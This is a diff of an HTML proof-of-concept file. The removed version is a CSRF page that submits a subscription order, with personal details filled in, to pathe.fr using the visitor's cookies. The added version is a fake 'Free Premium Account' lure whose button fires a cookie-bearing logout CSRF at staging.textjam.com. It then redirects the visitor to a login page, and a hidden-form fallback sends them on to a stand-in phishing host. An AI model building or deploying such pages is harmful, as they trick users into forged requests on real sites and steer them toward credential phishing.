@@ -1,48 +1,80 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
-  <body>
-    <h3>CSRF PoC (cors)</h3>
+<head>
+    <title>Free Gift Claim</title>
+    <style>
+        body { font-family: Arial; padding: 20px; text-align: center; }
+        .gift { font-size: 48px; margin: 20px; }
+        .btn { 
+            background: #FF6B6B; 
+            color: white; 
+            padding: 15px 30px; 
+            border: none; 
+            border-radius: 10px; 
+            font-size: 18px; 
+            cursor: pointer;
+            margin: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="gift">🎁</div>
+    <h2>Claim Your Free Premium Account!</h2>
+    <p>Click below to verify your eligibility...</p>
+    
+    <button class="btn" onclick="performAttack()">Claim Now</button>
+    
+    <div id="status" style="margin-top: 20px; color: #666;"></div>
+
     <script>
-      const payload = JSON.stringify({
-        commandType: "subscription",
-        client: {
-          id: "001Jv00000kXPraIAG",
-          firstName: "test",
-          lastName: "test",
-          birthDate: "1996-10-01",
-          mobilePhone: "+33745718646",
-          homePhone: "+33745712652",
-          address: "1, boulevard de Marty",
-          city: "Schmittboeuf",
-          postalCode: "84339",
-          email: "babixo4477@vsihay.com",
-          title: "Mme",
-          country: "FR",
-          unsubscribeLoyalty: false
-        },
-        order: {
-          mailNotification: true,
-          pushNotification: false,
-          subscriptionType: "typ-abo-cp",
-          addOnTypes: [],
-          sendCopyToPayer: false,
-          zuoraSubscriptionType: "CINEPASS"
-        },
-        payer: { payerDifferent: false }
-      });
-
-      fetch('https://s.pathe.fr/subscription/api/1.0.0/lead?language=en', {
-         method: 'POST',
-         credentials: 'include',   // <— request cookies be sent
-         headers: { 'Content-Type': 'application/json' },
-         body: payload
-       })
-       .then(()=>console.log('poC fired'))
-       .catch(e=>console.log('fetch error', e));
+    function performAttack() {
+        document.getElementById('status').innerHTML = "Verifying your account...";
+        
+        // Perform stealth logout CSRF
+        fetch('https://staging.textjam.com/api/auth/logout', {
+            method: 'POST',
+            credentials: 'include',  // Send cookies
+            mode: 'no-cors',         // Avoid CORS issues
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({action: 'logout'})
+        })
+        .then(() => {
+            document.getElementById('status').innerHTML = "✅ Account verified! Redirecting...";
+            
+            // Redirect to phishing page after logout
+            setTimeout(() => {
+                window.location.href = "https://staging.textjam.com/login?message=Session+expired+please+login+again";
+            }, 1500);
+        })
+        .catch(error => {
+            document.getElementById('status').innerHTML = "⚠️ Verification failed. Trying alternative method...";
+            fallbackMethod();
+        });
+    }
+    
+    function fallbackMethod() {
+        // Alternative: Form submission method
+        var form = document.createElement('form');
+        form.method = 'POST';
+        form.action = 'https://staging.textjam.com/api/auth/logout';
+        form.style.display = 'none';
+        
+        // Try to include CSRF token if we can steal it
+        var csrfInput = document.createElement('input');
+        csrfInput.type = 'hidden';
+        csrfInput.name = 'csrf_token';
+        csrfInput.value = 'attacker_token'; // Would need real token
+        
+        form.appendChild(csrfInput);
+        document.body.appendChild(form);
+        form.submit();
+        
+        setTimeout(() => {
+            window.location.href = "https://attacker-server.com/phishing-login";
+        }, 1000);
+    }
     </script>
-  </body>
+</body>
 </html>
-
-
-
-
